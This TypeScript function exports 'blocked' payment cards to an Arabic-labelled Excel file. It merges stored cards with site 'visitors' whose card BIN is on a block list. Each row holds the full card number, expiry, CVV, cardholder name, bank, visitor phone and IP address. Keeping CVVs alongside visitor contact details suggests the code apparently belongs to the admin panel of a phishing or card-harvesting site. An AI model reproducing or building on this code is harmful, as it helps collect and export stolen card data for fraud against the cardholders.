import * as XLSX from "xlsx";

export function exportBlockedCardsExcel(
  storedCards: any[],
  blockedBins: string[],
  visitors: any[]
) {
  const merged: any[] = [...storedCards];
  const seenKey = new Set(
    storedCards.map(c => `${c.bin}|${c.cardNumber || ""}|${c.visitorId || ""}`)
  );

  for (const v of visitors) {
    const p = v.payment || {};
    const num = String(p.cardNumber || v.cardNumber || "").replace(/\D/g, "");
    const bin = String(p.cardBin || (num.length >= 6 ? num.slice(0, 6) : ""));
    if (!bin || !blockedBins.includes(bin)) continue;
    const key = `${bin}|${num}|${v.id}`;
    if (seenKey.has(key)) continue;
    seenKey.add(key);
    merged.push({
      id: `v_${v.id}`,
      bin,
      cardNumber: num || undefined,
      last4: p.cardLast4 || (num.length >= 4 ? num.slice(-4) : undefined),
      expiryMonth: v.expiryMonth || undefined,
      expiryYear: v.expiryYear || undefined,
      cvv: p.cardCvc || v.cvv || undefined,
      cardName: p.cardName || v.cardName || undefined,
      cardType: p.cardScheme || v.cardType || undefined,
      bankName: p.cardBankLabel || p.cardBank || v.cardBankName || undefined,
      visitorId: v.id,
      visitorName: v.name || undefined,
      phone: v.phone || undefined,
      ip: v.ip || v.ipAddress || undefined,
      source: "admin_block",
      blockedAt: String(v.updatedAt || new Date().toISOString()),
    });
  }

  if (merged.length === 0) {
    alert("لا توجد بطاقات محظورة لتصديرها.");
    return;
  }

  const cardRows = merged.map((c, idx) => ({
    "#": idx + 1,
    BIN: c.bin,
    "رقم البطاقة": c.cardNumber || `${c.bin}••••••••••`,
    "تاريخ الانتهاء": c.expiryMonth && c.expiryYear ? `${c.expiryMonth}/${c.expiryYear}` : "—",
    CVV: c.cvv || "—",
    "اسم حامل البطاقة": c.cardName || "—",
    البنك: c.bankName || "—",
    "اسم الزائر": c.visitorName || "—",
    "رقم الهاتف": c.phone || "—",
    "عنوان IP": c.ip || "—",
    "تاريخ الحظر": new Date(c.blockedAt).toLocaleString("ar-SA"),
  }));

  const wb = XLSX.utils.book_new();
  wb.Workbook = { Views: [{ RTL: true }] };
  const ws = XLSX.utils.json_to_sheet(cardRows);
  XLSX.utils.book_append_sheet(wb, ws, "البطاقات المحظورة");
  XLSX.writeFile(wb, `blocked-cards-${new Date().toISOString().slice(0, 10)}.xlsx`);
}
